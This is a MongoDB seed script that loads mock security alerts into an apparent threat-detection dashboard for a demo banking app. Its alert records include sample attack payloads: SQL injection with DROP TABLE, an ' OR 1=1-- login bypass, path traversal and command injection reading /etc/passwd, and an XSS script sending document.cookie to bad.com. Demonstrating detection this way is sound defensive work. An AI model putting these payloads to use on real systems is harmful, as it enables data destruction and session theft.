// Mock Data Seed Script for ARIA MongoDB

db = db.getSiblingDB('aria_db');

// Clear existing alerts (optional, but good for a fresh dashboard)
// db.alerts.deleteMany({});

const now = new Date();
function randomTimeAgo(hours) {
    return new Date(now.getTime() - Math.floor(Math.random() * hours * 60 * 60 * 1000));
}

const mockAlerts = [
    {
        id: "req-mock-001",
        timestamp: randomTimeAgo(1),
        sourceIP: "103.45.12.99",
        method: "POST",
        path: "/api/transfer",
        headers: {},
        body: '{"account": "12345", "amount": 9999999999, "note": "DROP TABLE transactions;"}',
        userAgent: "Mozilla/5.0",
        aiDecision: "block",
        aiReasoning: "Multiple SQL injection keywords detected alongside anomalous financial amounts.",
        detectionSources: ["regex", "llm"],
        regexMatches: ["sqli", "bankingthreats"],
        category: "sqli",
        fidelityScore: 94,
        scores: { regex: 0.9, llm: 0.95, anomaly: 0.8, ueba: 0.2 },
        severity: "critical",
        triageStatus: "pending",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-002",
        timestamp: randomTimeAgo(2),
        sourceIP: "45.22.19.111",
        method: "POST",
        path: "/api/login",
        headers: {},
        body: '{"username": "admin", "password": "\' OR 1=1--"}',
        userAgent: "curl/7.68.0",
        aiDecision: "block",
        aiReasoning: "Classic authentication bypass attempt using SQL injection.",
        detectionSources: ["regex", "llm"],
        regexMatches: ["sqli"],
        category: "credential_stuffing",
        fidelityScore: 88,
        scores: { regex: 0.8, llm: 0.9, anomaly: 0.1, ueba: 0.1 },
        severity: "high",
        triageStatus: "escalated",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-003",
        timestamp: randomTimeAgo(5),
        sourceIP: "192.168.1.105",
        method: "GET",
        path: "/api/accounts/balance/../../../etc/passwd",
        headers: {},
        body: "",
        userAgent: "Mozilla/5.0",
        aiDecision: "block",
        aiReasoning: "Path traversal attempt to access sensitive system files.",
        detectionSources: ["regex"],
        regexMatches: ["traversal"],
        category: "traversal",
        fidelityScore: 75,
        scores: { regex: 0.8, llm: 0.4, anomaly: 0.1, ueba: 0.1 },
        severity: "high",
        triageStatus: "approved",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-004",
        timestamp: randomTimeAgo(12),
        sourceIP: "55.10.122.9",
        method: "POST",
        path: "/api/users/profile",
        headers: {},
        body: '{"profile": "<script>fetch(\'http://bad.com?c=\'+document.cookie)</script>"}',
        userAgent: "Mozilla/5.0",
        aiDecision: "block",
        aiReasoning: "Cross-Site Scripting (XSS) payload to steal session cookies.",
        detectionSources: ["regex", "llm"],
        regexMatches: ["xss"],
        category: "xss",
        fidelityScore: 85,
        scores: { regex: 0.9, llm: 0.7, anomaly: 0.2, ueba: 0.1 },
        severity: "high",
        triageStatus: "pending",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-005",
        timestamp: randomTimeAgo(0.5),
        sourceIP: "99.102.33.21",
        method: "GET",
        path: "/api/balance/7732",
        headers: {},
        body: "",
        userAgent: "Mozilla/5.0",
        aiDecision: "allow",
        aiReasoning: "Sequential account enumeration detected, but low confidence of actual breach.",
        detectionSources: ["ueba"],
        regexMatches: [],
        category: "account_enumeration",
        fidelityScore: 42,
        scores: { regex: 0.1, llm: 0.3, anomaly: 0.6, ueba: 0.7 },
        severity: "medium",
        triageStatus: "pending",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-006",
        timestamp: randomTimeAgo(24),
        sourceIP: "11.22.33.44",
        method: "POST",
        path: "/api/transfer",
        headers: {},
        body: '{"account": "regular", "amount": 50}',
        userAgent: "Mozilla/5.0",
        aiDecision: "allow",
        aiReasoning: "Normal transaction behavior.",
        detectionSources: ["none"],
        regexMatches: [],
        category: "none",
        fidelityScore: 5,
        scores: { regex: 0.0, llm: 0.0, anomaly: 0.0, ueba: 0.0 },
        severity: "info",
        triageStatus: "auto-resolved",
        serviceName: "Demo Banking App"
    },
    {
        id: "req-mock-007",
        timestamp: randomTimeAgo(3),
        sourceIP: "185.199.108.153",
        method: "POST",
        path: "/api/admin/config",
        headers: {},
        body: '{"cmd": "whoami; cat /etc/passwd"}',
        userAgent: "PostmanRuntime/7.28.4",
        aiDecision: "block",
        aiReasoning: "Command injection payload targeting admin endpoint.",
        detectionSources: ["regex", "llm"],
        regexMatches: ["commandinjection"],
        category: "command_injection",
        fidelityScore: 98,
        scores: { regex: 0.95, llm: 0.98, anomaly: 0.5, ueba: 0.3 },
        severity: "critical",
        triageStatus: "approved",
        serviceName: "Demo Banking App"
    }
];

// Generate extra bulk rows for charts
for(let i=8; i<=30; i++) {
    mockAlerts.push({
        id: `bulk-mock-${i}`,
        timestamp: randomTimeAgo(72),
        sourceIP: `203.0.113.${i}`,
        method: i % 2 === 0 ? "POST" : "GET",
        path: "/api/login",
        headers: {},
        body: "",
        userAgent: "Mozilla/5.0",
        aiDecision: i % 3 === 0 ? "block" : "allow",
        aiReasoning: "Automated baseline generation data.",
        detectionSources: [],
        regexMatches: [],
        category: i % 3 === 0 ? "credential_stuffing" : "none",
        fidelityScore: i % 3 === 0 ? (60 + i) : (10 + i%10),
        scores: { regex: 0.1, llm: 0.1, anomaly: 0.1, ueba: 0.1 },
        severity: i % 3 === 0 ? "medium" : "info",
        triageStatus: i % 5 === 0 ? "pending" : "auto-resolved",
        serviceName: "Demo Banking App"
    });
}

db.alerts.insertMany(mockAlerts);
print("Successfully inserted " + mockAlerts.length + " mock alerts!");
